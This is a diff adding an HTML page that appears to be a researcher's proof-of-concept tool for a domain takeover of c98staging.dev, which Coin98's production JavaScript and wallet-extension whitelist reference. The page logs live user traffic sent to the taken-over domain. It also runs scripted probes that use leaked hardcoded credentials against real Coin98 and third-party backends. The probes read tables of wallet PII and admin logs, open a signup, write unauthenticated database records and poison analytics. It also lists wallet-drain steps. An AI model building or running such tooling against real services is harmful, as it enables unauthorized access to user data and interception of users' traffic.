@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>exchange.c98staging.dev — Supply Chain Traffic Recorder</title>
+    <style>
+        :root {
+            --bg: #0c0c0c; --bg1: #111; --bg2: #181818; --border: #2a2a2a;
+            --fg: #c8c8c8; --fg2: #888; --fg3: #555;
+            --red: #e55; --green: #5b5; --blue: #68f; --yellow: #da3; --cyan: #5cc;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'IBM Plex Mono', 'SF Mono', monospace; background: var(--bg); color: var(--fg); font-size: 12px; line-height: 1.5; }
+        .container { max-width: 1060px; margin: 0 auto; padding: 24px 20px; }
+
+        .header { border-bottom: 2px solid var(--border); padding-bottom: 16px; margin-bottom: 20px; }
+        .header-id { color: var(--fg3); font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
+        .header-title { color: #fff; font-size: 16px; font-weight: 700; margin: 4px 0; }
+        .header-desc { color: var(--fg2); font-size: 11px; max-width: 700px; }
+
+        .section { margin-bottom: 24px; }
+        .section-title { color: var(--fg3); font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+                         border-bottom: 1px solid var(--border); padding-bottom: 4px; margin-bottom: 10px; }
+
+        .env-grid { display: grid; grid-template-columns: 160px 1fr; gap: 2px 12px; font-size: 11px; }
+        .env-key { color: var(--fg3); }
+        .env-val { color: var(--cyan); word-break: break-all; }
+        .env-val.crit { color: var(--red); font-weight: 700; }
+
+        .controls { margin-bottom: 16px; display: flex; gap: 8px; align-items: center; }
+        button { background: var(--bg2); color: var(--green); border: 1px solid var(--green); padding: 6px 16px;
+                 cursor: pointer; font-family: inherit; font-size: 11px; }
+        button:hover { background: var(--green); color: #000; }
+        button:disabled { opacity: 0.3; cursor: not-allowed; }
+        .status-text { font-size: 11px; color: var(--fg3); }
+
+        .summary-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 8px; margin: 12px 0; }
+        .summary-card { background: var(--bg2); border: 1px solid var(--border); padding: 10px; text-align: center; }
+        .summary-card .num { font-size: 22px; font-weight: 700; color: var(--green); }
+        .summary-card .label { color: var(--fg3); font-size: 9px; margin-top: 2px; }
+
+        /* Code reference */
+        .code-ref { background: var(--bg1); border: 1px solid var(--border); padding: 12px; font-size: 11px;
+                    margin-bottom: 12px; white-space: pre-wrap; color: var(--fg2); overflow-x: auto; }
+        .code-ref .comment { color: var(--fg3); }
+        .code-ref .highlight { color: var(--red); font-weight: 700; }
+        .code-ref .string { color: var(--green); }
+
+        /* Traffic log */
+        .log-entry { background: var(--bg2); border: 1px solid var(--border); padding: 10px; margin-bottom: 6px; }
+        .log-entry:hover { border-color: var(--fg3); }
+        .log-header { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; margin-bottom: 4px; }
+        .log-ts { color: var(--fg3); font-size: 10px; }
+        .log-method { font-weight: 700; font-size: 10px; padding: 1px 5px; }
+        .log-method.GET { background: #1a2e1a; color: var(--green); }
+        .log-method.POST { background: #2e2a1a; color: var(--yellow); }
+        .log-method.PUT { background: #1a1a2e; color: var(--blue); }
+        .log-method.DELETE { background: #2e1a1a; color: var(--red); }
+        .log-method.OPTIONS { background: var(--bg1); color: var(--fg3); }
+        .log-path { color: var(--cyan); font-size: 11px; word-break: break-all; }
+        .log-meta { font-size: 10px; color: var(--fg3); margin-top: 2px; }
+        .log-meta span { margin-right: 16px; }
+        .log-detail { display: none; margin-top: 8px; background: var(--bg); border: 1px solid #1a1a1a; padding: 8px;
+                      font-size: 10px; white-space: pre-wrap; color: var(--fg3); max-height: 200px; overflow-y: auto; }
+        .log-entry.open .log-detail { display: block; }
+        .log-toggle { color: var(--fg3); cursor: pointer; font-size: 9px; margin-left: auto; }
+        .log-toggle:hover { color: var(--fg); }
+
+        .empty-state { color: var(--fg3); text-align: center; padding: 40px; font-size: 11px; }
+        .empty-state .big { font-size: 14px; color: var(--fg2); margin-bottom: 8px; }
+
+        .badge { display: inline-block; font-size: 9px; padding: 1px 5px; font-weight: 700; letter-spacing: 0.5px;
+                 background: #2e1a1a; color: var(--red); border: 1px solid #4a2a2a; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <div class="header-id">CPK-2026-001 / Supply Chain Intercept</div>
+        <div class="header-title">exchange.c98staging.dev — Passive Traffic Recorder</div>
+        <div class="header-desc">
+            Coin98's production JavaScript references <code>exchange.c98staging.dev</code> as a staging exchange API.
+            The researcher controls c98staging.dev (domain takeover). This monitor records ALL traffic
+            that hits this subdomain — proving supply chain interception capability.
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Supply Chain Evidence</div>
+        <div class="env-grid">
+            <div class="env-key">Intercepted Domain</div><div class="env-val crit">exchange.c98staging.dev</div>
+            <div class="env-key">Referenced In</div><div class="env-val">superwallet-markets.coin98.tech JS bundle (production)</div>
+            <div class="env-key">DNS Control</div><div class="env-val">Researcher owns c98staging.dev — full wildcard control</div>
+            <div class="env-key">Original DNS</div><div class="env-val">NXDOMAIN (abandoned staging domain)</div>
+            <div class="env-key">Impact</div><div class="env-val crit">Intercept/modify all exchange API traffic from Coin98 apps</div>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Code Reference — Production JS Bundle</div>
+        <div class="code-ref"><span class="comment">// Found in: superwallet-markets.coin98.tech JavaScript bundles
+// Context: Exchange/swap API endpoint configuration
+// The production app makes HTTP requests to this domain:</span>
+
+<span class="highlight">const EXCHANGE_API = "https://exchange.c98staging.dev";</span>
+
+<span class="comment">// Also found in the COIN98_SYSTEM whitelist (background.js):
+// This means exchange.c98staging.dev inherits ALL whitelisted privileges</span>
+const COIN98_SYSTEM = [
+    <span class="string">"coin98.com"</span>, <span class="string">"dagora.xyz"</span>, <span class="string">"saros.finance"</span>, <span class="string">"baryon.network"</span>,
+    <span class="highlight">"c98staging.dev"</span>,  <span class="comment">// ← any subdomain matches</span>
+    <span class="string">"localhost"</span>, <span class="string">"127.0.0.1"</span>, <span class="comment">// ... 8 more origins</span>
+];</div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Hardcoded Secrets Inventory (from Extension JS)</div>
+        <div style="font-size:10px; color:var(--fg3); margin-bottom:8px;">All secrets below are extracted from public client-side JS bundles and the Chrome Extension source (ASSET_INTELLIGENCE.md §11.0f). An attacker on this domain has access to all of them.</div>
+        <table style="width:100%; border-collapse:collapse; font-size:10px;">
+            <thead><tr style="border-bottom:1px solid var(--border); color:var(--fg3); text-align:left;">
+                <th style="padding:4px 6px;">#</th><th style="padding:4px 6px;">Secret</th><th style="padding:4px 6px;">Env Var</th><th style="padding:4px 6px;">Source</th><th style="padding:4px 6px;">Severity</th>
+            </tr></thead>
+            <tbody id="secrets-table"></tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Active Probes — What This Origin Can Reach</div>
+        <div style="font-size:10px; color:var(--fg3); margin-bottom:8px;">Server-side probes from exchange.c98staging.dev using hardcoded secrets. Proves an attacker controlling this subdomain can access all Coin98 backend infrastructure.</div>
+        <div class="controls">
+            <button id="btn-probes" onclick="runActiveProbes()">Run Active Probes</button>
+            <span class="status-text" id="probe-status"></span>
+        </div>
+        <div class="summary-grid" id="probe-summary">
+            <div class="summary-card"><div class="num" id="p-ok">—</div><div class="label">Accessible</div></div>
+            <div class="summary-card"><div class="num" id="p-auth">—</div><div class="label">Auth Accepted</div></div>
+            <div class="summary-card"><div class="num" id="p-blocked">—</div><div class="label">Blocked</div></div>
+            <div class="summary-card"><div class="num" id="p-total">—</div><div class="label">Total Probes</div></div>
+        </div>
+        <div id="probe-results"></div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Captured Traffic</div>
+        <div class="summary-grid" id="summary">
+            <div class="summary-card"><div class="num" id="s-total">—</div><div class="label">Total Requests Captured</div></div>
+            <div class="summary-card"><div class="num" id="s-unique">—</div><div class="label">Unique Source IPs</div></div>
+            <div class="summary-card"><div class="num" id="s-paths">—</div><div class="label">Unique Paths Hit</div></div>
+        </div>
+
+        <div class="controls">
+            <button onclick="loadLogs()">Refresh Traffic Log</button>
+            <button onclick="sendTestPing()">Send Test Ping</button>
+            <span class="status-text" id="log-status"></span>
+        </div>
+
+        <div id="traffic-log">
+            <div class="empty-state">
+                <div class="big">No traffic captured yet</div>
+                Click "Send Test Ping" to verify the recorder works, or wait for organic traffic from Coin98 apps.
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">What This Proves</div>
+        <div style="font-size:11px; color:var(--fg2);">
+            <p style="margin-bottom:8px;">
+                <span class="badge">SUPPLY CHAIN</span> &nbsp;
+                Coin98's production code sends API requests to <code>exchange.c98staging.dev</code>.
+                Because the researcher controls the DNS for <code>c98staging.dev</code>, they can:
+            </p>
+            <ol style="padding-left:20px; margin-bottom:12px;">
+                <li>Intercept and log all exchange API requests (this page)</li>
+                <li>Return manipulated responses — fake token prices, fake swap routes</li>
+                <li>Redirect swap transactions to attacker-controlled contracts</li>
+                <li>Exfiltrate request data including wallet addresses and trade parameters</li>
+                <li>Combine with the extension exploit (c98staging.dev) for full wallet drain</li>
+            </ol>
+            <p>
+                This is a <b>zero-click supply chain attack</b>. No user interaction required beyond using Coin98 normally.
+                The production JS automatically sends requests to the attacker's domain.
+            </p>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// ── ALL secrets are server-side only (Netlify env vars) ──
+// Client shows secret NAMES + severity, never values
+// Proxy function injects credentials based on authHint
+
+// Secrets inventory — names only, no values exposed
+const SECRETS_LIST = [
+    { name: 'Google OAuth Client SECRET', env: 'GOOGLE_OAUTH_CLIENT_SECRET', src: 'CloudSync*.js (×3)', sev: 'CRIT' },
+    { name: 'Google OAuth Client ID', env: 'GOOGLE_OAUTH_CLIENT_ID', src: 'CloudSync*.js, WalletSocial*.js', sev: 'CRIT' },
+    { name: 'Supabase Campaign Anon Key', env: 'SUPABASE_CAMPAIGN_ANON_KEY', src: 'campaign.coin98.com JS', sev: 'HIGH' },
+    { name: 'Supabase 2025 Anon Key', env: 'SUPABASE_2025_ANON_KEY', src: '2025.coin98.com JS', sev: 'HIGH' },
+    { name: 'JWT HS512 (NO EXPIRY, id=526)', env: 'JWT_HS512_NO_EXPIRY', src: 'background worker', sev: 'HIGH' },
+    { name: 'JWT HS256 (expired)', env: 'JWT_HS256_EXPIRED', src: 'background worker', sev: 'LOW' },
+    { name: 'TON API Bearer', env: 'TON_API_BEARER', src: 'ton.js', sev: 'HIGH' },
+    { name: 'GA4 API Secret', env: 'GA4_API_SECRET', src: 'background worker', sev: 'HIGH' },
+    { name: 'Static HMAC Signature', env: 'STATIC_HMAC_SIGNATURE', src: 'background worker', sev: 'HIGH' },
+    { name: 'Cloud Backup HMAC Key', env: 'CLOUD_BACKUP_HMAC_KEY', src: 'CloudSyncRestore*.js', sev: 'HIGH' },
+    { name: 'Google/Firebase API Key', env: 'FIREBASE_API_KEY', src: 'WalletSocial, CloudSync (×6)', sev: 'HIGH' },
+    { name: 'BlockVision Sui API Key', env: 'BLOCKVISION_SUI_KEY', src: 'background worker', sev: 'HIGH' },
+    { name: 'TokenView API Key', env: 'TOKENVIEW_KEY', src: 'background worker', sev: 'HIGH' },
+    { name: 'Infura Project ID #1', env: 'INFURA_ID_1', src: '35+ chain handlers', sev: 'HIGH' },
+    { name: 'Infura Project ID #2', env: 'INFURA_ID_2', src: 'evm.js, background', sev: 'HIGH' },
+    { name: 'Infura Project ID #3', env: 'INFURA_ID_3', src: 'NFT, TokenSend, WalletCard', sev: 'HIGH' },
+    { name: 'NodeReal BSC Key', env: 'NODEREAL_BSC_KEY', src: 'background worker', sev: 'HIGH' },
+    { name: 'Basescan API Key', env: 'BASESCAN_KEY', src: 'InitService (CHAIN_HISTORY)', sev: 'MED' },
+    { name: 'Lineascan API Key', env: 'LINEASCAN_KEY', src: 'InitService', sev: 'MED' },
+    { name: 'Scrollscan API Key', env: 'SCROLLSCAN_KEY', src: 'InitService', sev: 'MED' },
+    { name: 'OKLink API Key', env: 'OKLINK_KEY', src: 'InitService (Manta, KuCoin, xLayer)', sev: 'MED' },
+    { name: 'GA4 Measurement ID', env: 'GA4_MEASUREMENT_ID', src: 'background worker', sev: 'MED' },
+];
+
+// Render secrets table — names and env var refs only, NO values
+(function renderSecrets() {
+    const tbody = document.getElementById('secrets-table');
+    tbody.innerHTML = SECRETS_LIST.map((s, i) => {
+        const sevColor = s.sev === 'CRIT' ? 'var(--red)' : s.sev === 'HIGH' ? 'var(--yellow)' : 'var(--fg3)';
+        return `<tr style="border-bottom:1px solid #1a1a1a;">
+            <td style="padding:3px 6px; color:var(--fg3);">${i+1}</td>
+            <td style="padding:3px 6px; color:var(--fg);">${esc(s.name)}</td>
+            <td style="padding:3px 6px; color:var(--cyan); font-family:monospace;">${esc(s.env)}</td>
+            <td style="padding:3px 6px; color:var(--fg3);">${esc(s.src)}</td>
+            <td style="padding:3px 6px; color:${sevColor}; font-weight:700;">${s.sev}</td>
+        </tr>`;
+    }).join('');
+})();
+
+// ── Active probes — secrets injected server-side via authHint ──
+const PROBES = [
+    { name: 'Supabase Campaign /lc_campaigns (wallet PII)', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/lc_campaigns?select=*&limit=3', authHint: 'supabase_campaign' },
+    { name: 'Supabase Campaign /campaigns', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/campaigns?select=*&limit=3', authHint: 'supabase_campaign' },
+    { name: 'Supabase 2025 /wallet_addresses (PII)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/wallet_addresses?select=*&limit=3', authHint: 'supabase_2025' },
+    { name: 'Supabase 2025 /admin_activity_logs', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/admin_activity_logs?select=*&limit=3', authHint: 'supabase_2025' },
+    { name: 'Supabase 2025 auth settings (signup open?)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/auth/v1/settings', authHint: 'supabase_2025_anon' },
+    { name: '2025 POST /auth/v1/signup (OPEN REGISTRATION!)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/auth/v1/signup', method: 'POST', authHint: 'supabase_2025_anon',
+      body: JSON.stringify({email:"cpk-exchange-probe@example.com",password:"CPK_probe_2026!"}) },
+    { name: 'Misc /events (JWT HS512 no-expiry)', url: 'https://superwallet-misc.coin98.tech/events', authHint: 'jwt_hs512' },
+    { name: 'Xpoint /boba/stats (JWT HS512)', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/stats', authHint: 'jwt_hs512' },
+    { name: 'Markets /api/token-prices (18K tokens)', url: 'https://superwallet-markets.coin98.tech/api/token-prices' },
+    { name: 'Misc /swagger.json (OpenAPI spec)', url: 'https://superwallet-misc.coin98.tech/swagger.json' },
+    { name: 'Xpoint /boba/leaderboard (31K wallets)', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/leaderboard' },
+    { name: 'History POST /record/log (UNAUTH MongoDB write!)', url: 'https://superwallet-history-records.coin98.tech/record/log', method: 'POST',
+      body: JSON.stringify({from:"0x0000000000000000000000000000000000000000",to:"0x0000000000000000000000000000000000000001",amount:"0",chain:"ethereum",hash:"0xEXCHANGE_PROBE",type:"transfer",status:"pending"}) },
+    { name: 'Infura ETH mainnet (#2)', url: 'https://mainnet.infura.io/v3/', method: 'POST', authHint: 'infura_2',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { name: 'BlockVision Sui', url: 'https://sui-mainnet.blockvision.org/v1/', method: 'POST', authHint: 'blockvision_sui',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"sui_getLatestCheckpointSequenceNumber",params:[]}) },
+    { name: 'TON API (bearer auth)', url: 'https://tonapi.io/v2/blockchain/masterchain-head', authHint: 'ton' },
+    { name: 'Basescan (V1 deprecated)', url: 'https://api.basescan.org/api?module=proxy&action=eth_blockNumber', authHint: 'basescan' },
+    { name: 'GA4 debug collect (analytics poison)', url: 'https://www.google-analytics.com/debug/mp/collect?', method: 'POST', authHint: 'ga4',
+      body: JSON.stringify({client_id:"EXCHANGE_PROBE",events:[{name:"exchange_probe",params:{from:"exchange.c98staging.dev"}}]}) },
+    { name: 'Firebase project config', url: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key=', authHint: 'firebase' },
+];
+
+async function runActiveProbes() {
+    const el = document.getElementById('probe-results');
+    const st = document.getElementById('probe-status');
+    document.getElementById('btn-probes').disabled = true;
+    st.textContent = 'Running probes via server-side proxy...';
+    el.innerHTML = '';
+
+    let ok = 0, auth = 0, blocked = 0;
+
+    for (let i = 0; i < PROBES.length; i++) {
+        const p = PROBES[i];
+        st.textContent = `Probe ${i+1}/${PROBES.length}: ${p.name}`;
+
+        try {
+            const payload = { url: p.url, method: p.method || 'GET' };
+            if (p.authHint) payload.authHint = p.authHint;
+            if (p.body) payload.body = p.body;
+
+            const ac = new AbortController();
+            const to = setTimeout(() => ac.abort(), 15000);
+            const resp = await fetch('/.netlify/functions/proxy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                signal: ac.signal,
+            });
+            clearTimeout(to);
+            const data = await resp.json();
+
+            const status = data.status || 0;
+            const isOk = status >= 200 && status < 300;
+            const isAuth = status === 401 || status === 403;
+            if (isOk) ok++;
+            else if (isAuth) auth++;
+            else blocked++;
+
+            const preview = (data.body || '').slice(0, 200);
+            const statusColor = isOk ? 'var(--green)' : isAuth ? 'var(--yellow)' : 'var(--red)';
+            const logInfo = data.log ? `\n\n─── Proxy Log ───\nauthHint: ${data.log.authHint}\nauthInjected: ${JSON.stringify(data.log.authInjected)}\nurlModified: ${data.log.urlModified}\nmissingEnvKeys: ${JSON.stringify(data.log.missingEnvKeys)}` : '';
+
+            el.innerHTML += `<div class="log-entry" onclick="this.classList.toggle('open')">
+                <div class="log-header">
+                    <span style="color:${statusColor}; font-weight:700; font-size:10px; min-width:30px;">${status || 'ERR'}</span>
+                    <span class="log-path">${esc(p.name)}</span>
+                    <span style="color:var(--fg3); font-size:9px;">${p.authHint ? '[' + p.authHint + ']' : ''}</span>
+                    <span class="log-toggle">[details]</span>
+                </div>
+                <div class="log-meta"><span>URL: ${esc(p.url.slice(0, 80))}</span><span>${data.timing ? data.timing + 'ms' : ''}</span></div>
+                <div class="log-detail">${esc(preview)}${data.body && data.body.length > 200 ? '\n\n... truncated' : ''}\n\n─── Response Headers ───\n${esc(JSON.stringify(data.headers || {}, null, 2))}${esc(logInfo)}</div>
+            </div>`;
+        } catch (e) {
+            blocked++;
+            el.innerHTML += `<div class="log-entry">
+                <div class="log-header">
+                    <span style="color:var(--red); font-weight:700; font-size:10px;">ERR</span>
+                    <span class="log-path">${esc(p.name)}</span>
+                </div>
+                <div class="log-meta"><span>${esc(e.message)}</span></div>
+            </div>`;
+        }
+    }
+
+    document.getElementById('p-ok').textContent = ok;
+    document.getElementById('p-auth').textContent = auth;
+    document.getElementById('p-blocked').textContent = blocked;
+    document.getElementById('p-total').textContent = PROBES.length;
+    st.textContent = `Done — ${ok} accessible, ${auth} auth-gated, ${blocked} blocked`;
+    document.getElementById('btn-probes').disabled = false;
+}
+
+// ── Traffic log functions ──
+async function loadLogs() {
+    const el = document.getElementById('traffic-log');
+    const st = document.getElementById('log-status');
+    st.textContent = 'Loading...';
+
+    try {
+        const lac = new AbortController();
+        const lto = setTimeout(() => lac.abort(), 10000);
+        const resp = await fetch('/.netlify/functions/logs', { signal: lac.signal });
+        clearTimeout(lto);
+
+        // Handle non-JSON responses (function crash returns HTML)
+        const contentType = resp.headers.get('content-type') || '';
+        if (!resp.ok || !contentType.includes('json')) {
+            const text = await resp.text();
+            el.innerHTML = `<div class="empty-state"><div class="big">Function error (HTTP ${resp.status})</div><pre style="text-align:left;font-size:10px;white-space:pre-wrap;max-width:600px;margin:8px auto;">${esc(text.slice(0, 800))}</pre></div>`;
+            st.textContent = `Error: HTTP ${resp.status}`;
+            return;
+        }
+        const data = await resp.json();
+
+        if (data.error) {
+            el.innerHTML = `<div class="empty-state"><div class="big">Blob store error</div>${data.error}<br>${data.hint || ''}</div>`;
+            st.textContent = 'Error loading logs';
+            return;
+        }
+
+        document.getElementById('s-total').textContent = data.count || 0;
+
+        const entries = data.entries || [];
+        if (entries.length === 0) {
+            el.innerHTML = `<div class="empty-state"><div class="big">No traffic captured yet</div>Send a test ping or wait for Coin98 app traffic.</div>`;
+            st.textContent = `${data.count} total requests`;
+            return;
+        }
+
+        // Compute unique IPs and paths
+        const ips = new Set(entries.map(e => e.sourceIp).filter(Boolean));
+        const paths = new Set(entries.map(e => e.path).filter(Boolean));
+        document.getElementById('s-unique').textContent = ips.size;
+        document.getElementById('s-paths').textContent = paths.size;
+
+        el.innerHTML = entries.map((e, i) => `
+            <div class="log-entry" onclick="this.classList.toggle('open')">
+                <div class="log-header">
+                    <span class="log-ts">${e.timestamp || '—'}</span>
+                    <span class="log-method ${e.method || ''}">${e.method || '?'}</span>
+                    <span class="log-path">${esc(e.path || '/')}</span>
+                    <span class="log-toggle">[details]</span>
+                </div>
+                <div class="log-meta">
+                    <span>IP: ${esc(e.sourceIp || '—')}</span>
+                    <span>Origin: ${esc(e.origin || '—')}</span>
+                    <span>UA: ${esc((e.userAgent || '').slice(0, 60))}</span>
+                </div>
+                <div class="log-detail">${esc(JSON.stringify(e, null, 2))}</div>
+            </div>
+        `).join('');
+
+        st.textContent = `Showing ${entries.length} of ${data.count} captured requests`;
+
+    } catch (e) {
+        // Show detailed error for debugging
+        let detail = e.message;
+        try {
+            const errResp = await fetch('/.netlify/functions/logs');
+            detail += `\n\nHTTP ${errResp.status} ${errResp.statusText}`;
+            const text = await errResp.text();
+            detail += `\nResponse: ${text.slice(0, 500)}`;
+        } catch (e2) {
+            detail += `\nRetry also failed: ${e2.message}`;
+        }
+        el.innerHTML = `<div class="empty-state"><div class="big">Failed to load logs</div><pre style="text-align:left;font-size:10px;white-space:pre-wrap;max-width:600px;margin:8px auto;">${esc(detail)}</pre></div>`;
+        st.textContent = 'Error — see details above';
+    }
+}
+
+async function sendTestPing() {
+    const st = document.getElementById('log-status');
+    st.textContent = 'Sending test ping...';
+
+    try {
+        // Send a test request to the catch-all endpoints
+        const paths = ['/api/v1/exchange/pairs', '/health', '/v1/swap/quote'];
+        for (const path of paths) {
+            try {
+                const pac = new AbortController();
+                const pto = setTimeout(() => pac.abort(), 5000);
+                await fetch(path, {
+                    method: 'GET',
+                    headers: { 'X-Test': 'CPK-2026-001-ping', 'Accept': 'application/json' },
+                    signal: pac.signal,
+                });
+                clearTimeout(pto);
+            } catch (e) {}
+        }
+        st.textContent = 'Test pings sent — click Refresh to see them.';
+    } catch (e) {
+        st.textContent = `Ping error: ${e.message}`;
+    }
+}
+
+function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+// Auto-load on page open
+loadLogs();
+// Auto-refresh every 15 seconds
+setInterval(loadLogs, 15000);
+</script>
+</body>
+</html>
